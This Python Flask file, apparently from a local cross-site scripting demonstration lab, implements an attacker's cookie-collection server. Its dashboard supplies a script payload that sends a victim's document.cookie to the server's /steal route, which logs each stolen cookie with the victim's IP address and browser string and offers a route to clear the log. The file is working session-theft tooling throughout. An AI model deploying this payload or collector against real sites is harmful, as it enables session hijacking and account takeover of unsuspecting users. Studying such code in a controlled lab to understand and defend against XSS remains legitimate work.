import os
from datetime import datetime

from flask import Flask, redirect, render_template, request, url_for

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
HACKER_LOG_PATH = os.path.join(BASE_DIR, "hacker_cookies.txt")

attacker_app = Flask(__name__, template_folder="templates")


def read_stolen_logs(limit=100):
    if not os.path.exists(HACKER_LOG_PATH):
        return []

    with open(HACKER_LOG_PATH, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f.readlines() if line.strip()]

    # Hien thi moi nhat o tren cung
    return list(reversed(lines[-limit:]))


@attacker_app.route("/")
def hacker_dashboard():
    payload = "<script>new Image().src='http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie)</script>"
    logs = read_stolen_logs()
    return render_template("hacker_dashboard.html", payload=payload, logs=logs)


@attacker_app.route("/steal")
def steal_cookie():
    stolen_cookie = request.args.get("cookie", "")
    source_ip = request.remote_addr or "unknown"
    user_agent = request.headers.get("User-Agent", "unknown")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    line = f"[{timestamp}] IP={source_ip} | cookie={stolen_cookie} | UA={user_agent}\n"
    with open(HACKER_LOG_PATH, "a", encoding="utf-8") as f:
        f.write(line)

    return {
        "status": "ok",
        "message": "Hacker server da nhan cookie",
        "cookie": stolen_cookie,
    }


@attacker_app.route("/clear", methods=["POST"])
def clear_logs():
    with open(HACKER_LOG_PATH, "w", encoding="utf-8"):
        pass
    return redirect(url_for("hacker_dashboard"))


if __name__ == "__main__":
    if not os.path.exists(HACKER_LOG_PATH):
        with open(HACKER_LOG_PATH, "w", encoding="utf-8"):
            pass

    attacker_app.run(host="127.0.0.1", port=5001, debug=True)
